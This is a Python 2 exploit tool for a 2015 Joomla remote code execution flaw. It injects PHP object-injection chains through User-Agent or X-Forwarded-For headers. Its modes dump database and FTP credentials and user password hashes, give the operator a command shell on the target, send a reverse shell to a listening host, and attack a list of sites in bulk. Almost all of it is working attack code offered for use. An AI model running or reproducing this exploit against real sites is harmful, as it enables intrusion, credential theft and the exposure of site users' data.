#!/usr/bin/python2
# Jaime Cochran - 2015
# `gr33tz` to Darren/infodox/Dr. David D. Davidson
# coding: utf-8

import urllib2
from urllib2 import Request, urlopen, URLError, HTTPError
import httplib
import sys
import random
import argparse
import string
import os
import readline
import socket
readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')

red = "\x1b[1;31m"
green = "\x1b[1;32m"
clear = "\x1b[0m"
blue = "\x1b[1;34m"

def banner():
    print """\n%s    .---.    .-'''-.        .-'''-.                             .-'''-.          
    |   |   '   _    \     '   _    \                  .---.   '   _    \  .---. 
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   |   | /   /` '.   \ |   | 
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. |   |.   |     \  ' |   | 
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '|   ||   '      |  '|   | 
    |   |\    \     / / \    \     / / |  |  |  |  |  ||   |\    \     / / |   | 
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  ||   | `.   ` ..' /  |   | 
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||   |    '-...-'`   |   | 
    |   |                              |  |  |  |  |  ||   |               |   | 
    |   |                              |__|  |__|  |__||   |               |   | 
 __.'   '                                              '---'               '---' 
|      '                                                                         
|____.'                                                                          
          %sJoomla User-Agent/X-Forwarded-For RCE%s""" %(green, blue, clear)

def php_encoder(php_payload): # infodox style
    f = open(php_payload, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64').replace("\n", "").strip()
    return encoded

def build_chain(evil):
    one = """}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";"""
    two = """eval(base64_decode('%s'));JFactory::getConfig();exit;""" %(evil)
    three = """";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}"""
    four = '\xf0\xfd\xfd\xfd'
    payload = """%ss:%d:\"%s%s%s""" %(one, len(two), two, three, four)
    return payload

def build_chain2(evil):
    one = """ewah}__jgkaeg|O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";"""
    two = """eval(base64_decode('%s'));JFactory::getConfig();exit;""" %(evil)
    three  = """";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'"""
    four = '\xf0\xfd\xfd\xfd'
    payload = """%ss:%d\"%s%s%s""" %(one, len(two), two, three, four)
    return payload

def hack(url, header, php_payload, pop_chain, ipback, port):
    rand = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    evil = """eval(base64_decode($_SERVER['HTTP_%s']));""" %(rand)
    evil = evil.encode('base64').replace("\n", "").strip()

    if pop_chain == '1':
        pop_chain = build_chain(evil=evil)
    if pop_chain == '2':
        pop_chain = build_chain2(evil=evil)

    try:
        req = urllib2.Request(url)
       
        if header == "ua":
            req.add_header('User-Agent', pop_chain)
        if header == "xff":
            req.add_header('X-Forwarded-For', pop_chain)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')

        resp = urllib2.urlopen(req, timeout = 10)
    except urllib2.HTTPError, error:
        print "%s[+] you have FAILED: %s%s" %(red, error.read(), clear)
    except URLError as e:
        print e.reason
    except httplib.BadStatusLine as e:
        pass
    except socket.timeout as e:
        pass
        
    else:
        cookie = resp.headers.get('Set-Cookie')

        print "[+] first request: a solid %s" %(resp.getcode())
        print "[+] moneyshot is a gohoho"
        
        backvals = {'host': ipback, 'port': port}
        req2 = urllib2.Request(url)
        req2.add_header('cookie', cookie)
        req2.add_header('X-Backwarded-For', "; ".join('%s=%s' % (k,v) for k,v in backvals.items()))
        req2.add_header(rand, php_payload)
        req2.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')

        try:
            resp = urllib2.urlopen(req2)
            return resp.read()
        except urllib2.HTTPError, error:
            print error.read()
        except URLError as e:
            print "%s[!] YOU HAVE FAILED: %s%s" %(red, e.reason, clear)

def grip_deets(url, pop_chain):
    grip = "IAogaW5jbHVkZSgnY29uZmlndXJhdGlvbi5waHAnKTsKICRKQ29uZmlnID0gbmV3IEpDb25maWco"
    grip += "KTsKICRob3N0ID0gJEpDb25maWctPmhvc3Q7CiAkdXNlciA9ICRKQ29uZmlnLT51c2VyOwogJHBh"
    grip += "c3N3b3JkID0gJEpDb25maWctPnBhc3N3b3JkOwogJGRiID0gJEpDb25maWctPmRiOwogJHByZWZp"
    grip += "eCA9ICRKQ29uZmlnLT5kYnByZWZpeDsKICR1bmFtZSA9IHBocF91bmFtZSgpOwogZWNobyAiXG5b"
    grip += "K10gUEhQIHVuYW1lOiAiLiR1bmFtZS4iXG4iOwogZWNobyAiWytdIEdhdGhlcmluZyBEQk1TIERh"
    grip += "dGEuLi5cbiI7CiBlY2hvICJbKl0gTXlTUUwgSG9zdDogIi4kaG9zdC4iXG4iOwogZWNobyAiWypd"
    grip += "IE15U1FMIFVzZXI6ICIuJHVzZXIuIlxuIjsKIGVjaG8gIlsqXSBNeVNRTCBQYXNzd29yZDogIi4k"
    grip += "cGFzc3dvcmQuIlxuIjsKIGVjaG8gIlsqXSBNeVNRTCBEYXRhYmFzZTogIi4kZGIuIlxuIjsKIGlm"
    grip += "ICgkSkNvbmZpZy0+ZnRwX2VuYWJsZSA9PSAiMSIpIHsKICAgICBlY2hvICJbK10gR2F0aGVyaW5n"
    grip += "IEZUUCBEYXRhXG4iOwogICAgIGVjaG8gIlsqXSBGVFAgSG9zdDogIi4kSkNvbmZpZy0+ZnRwX2hv"
    grip += "c3QuIlxuIjsKICAgICBlY2hvICJbKl0gRlRQIFBvcnQ6ICIuJEpDb25maWctPmZ0cF9wb3J0LiJc"
    grip += "biI7CiAgICAgZWNobyAiWypdIEZUUCBVc2VyOiAiLiRKQ29uZmlnLT5mdHBfdXNlci4iXG4iOwog"
    grip += "ICAgIGVjaG8gIlsqXSBGVFAgUGFzc3dvcmQ6ICIuJEpDb25maWctPmZ0cF9wYXNzLiJcbiI7CiAg"
    grip += "ICAgZWNobyAiWypdIEZUUCBSb290OiAiLiRKQ29uZmlnLT5mdHBfcm9vdC4iXG4iOwogfSBlbHNl"
    grip += "IHsKICAgICBlY2hvICJbIV0gRlRQIERpc2FibGVkIG9uIHRoaXMgaG9zdCwgc2tpcHBpbmcuXG4i"
    grip += "OwogfQogZWNobyAiWytdIE5vdyB0byBncmFiIHVzZXJ0YWJsZXMuLi5cbiI7CiAkY29ubmVjdGlv"
    grip += "biA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VyLCAkcGFzc3dvcmQsICRkYik7CiAkdGFibGUgPSAk"
    grip += "cHJlZml4LiJ1c2VycyI7CiAkaGFydmVzdCA9ICJTRUxFQ1QgdXNlcm5hbWUsZW1haWwscGFzc3dv"
    grip += "cmQgRlJPTSAiLiR0YWJsZTsKICRyZXN1bHQgPSAkY29ubmVjdGlvbi0+cXVlcnkoJGhhcnZlc3Qp"
    grip += "OyAKIGlmICgkcmVzdWx0LT5udW1fcm93cyA+IDApIHsKICAgICB3aGlsZSgkcm93ID0gJHJlc3Vs"
    grip += "dC0+ZmV0Y2hfYXNzb2MoKSkgewogICAgICAgICBlY2hvICJbKl0gVXNlcm5hbWU6ICIuJHJvd1sn"
    grip += "dXNlcm5hbWUnXS4iICAgRW1haWw6ICIuJHJvd1snZW1haWwnXS4iICAgUGFzc3dvcmQ6ICIuJHJv"
    grip += "d1sncGFzc3dvcmQnXS4iXG4iOwogICAgIH0KIH0gZWxzZSB7CiAgICAgZWNobyAiWy1dIFVzZXJ0"
    grip += "YWJsZSBkdW1wIGZ1Y2tlZCB1cC4gSXMgdGhlcmUgbm8gdXNlcnM/XG4iOwogfQogJGNvbm5lY3Rp"
    grip += "b24tPmNsb3NlKCk7CiAK"

    read = hack(url=url, header="xff", php_payload=grip, pop_chain=pop_chain, ipback=None, port=None)
    
    if read == None:
        return "[!] nope"
    elif read.find("DBMS") == -1:
        return "[!] PORBABBBLY NOT VULN"
    elif read.find("</html>") and read.find("DBMS") != -1:
        return read.split("</html>")[1]
    else:
        return read

def shell(url, pop_chain): # mostly infodox 'pty'
    print "%s[*] Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something" %(green)
    while True:
        cmd = raw_input("~$ ")
        if cmd == "exit":
            sys.exit("%s[!] Shell exiting!%s" %(red, clear))
        else:
            cmd = """system('%s');""" %(cmd)
            cmd = cmd.encode("base64").replace("\n", "").strip()
            read = hack(url=url, header="xff", php_payload=cmd, pop_chain=pop_chain, ipback=None, port=None)
            if read.find("</html>") == -1:
                print "\n".join(read)
            else:
                print read.split("</html>")[1]

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('-t',  action='store', dest='url',
                      help='Target url/ip')
    parser.add_argument('-p', action='store', dest='php_payload',
                      help='PHP payload')
    parser.add_argument('-i', action='store_true', default=False, dest='grip', 
                      help='Gather info from Joomlas config file')
    parser.add_argument('--chain', action='store', default='1', dest='pop_chain',
                      help='Choose POP chain 1 or 2')
    parser.add_argument('--shell', action='store_true', default=False, dest='shell',
                      help='Drop very shitty shell(USE SPARINGLY)')
    parser.add_argument('-m', action='store_true', default=False, dest='mass',
                      help='Enable mass exploitation(must provide list of hosts)')
    parser.add_argument('--list', action='store', dest='targets',
                      help='File containing list of URLs')
    parser.add_argument('--header', action='store', default='xff',
                      help='Choose either ua or xff header')
    parser.add_argument('--host', action='store', dest='ipback',
                      help='Listening backconnect host')
    parser.add_argument('--port', action='store', dest='port',
                      help='Port listeninging on backconnect host')
    parser.add_argument('--out', action='store', dest='out',
                      help='Log all yr shit to a fucking file')
    args = parser.parse_args()
    
    print "%s[+] testing one two on dat %s%s" %(green, args.url, clear)

    if args.grip == True and args.mass == False:
        print grip_deets(url=args.url, pop_chain=args.pop_chain)
    elif args.url == None and args.mass == False:
        parser.error("please provide a target: -t url for a reverse shell or -m, -p php_payload.php and --list hosts.txt for mass exploitation")
    elif args.shell == True:
        shell(url=args.url, pop_chain=args.pop_chain)
    elif args.mass == True:
        if args.php_payload == None and args.targets == None or args.grip == False:
            parser.error("error: -m requires -p or -i and --list")
        if args.grip == True:
            with open(args.targets, "r") as f:
                for l in f:
                    l = l.replace("\n","")
                    print "[+] This site: http://%s/" %(l)
                    l = "http://%s" %(l)
                    print grip_deets(url=l, pop_chain=args.pop_chain)
                   
        else:
            print "[+] Mass shellin' of the joomlols is a go!"
            with open(args.targets, "r") as f:
                for l in f:
                    l = l.replace("\n","")
                    l = "http://%s" %(l)
                    print hack(url=l, header=args.header, php_payload=php_encoder(args.php_payload), pop_chain=args.pop_chain, ipback=None, port=None)
    elif args.php_payload == None and args.ipback == None and args.port == None:
        parser.error("reverse shell depends on -p pay_load --host 127.0.0.1 --port 4444")
    else:
        print "[+] Attempting to exploit..."
        print hack(url=args.url, header=args.header, php_payload=php_encoder(args.php_payload), pop_chain=args.pop_chain, ipback=args.ipback, port=args.port)

if __name__ == "__main__":
    main()
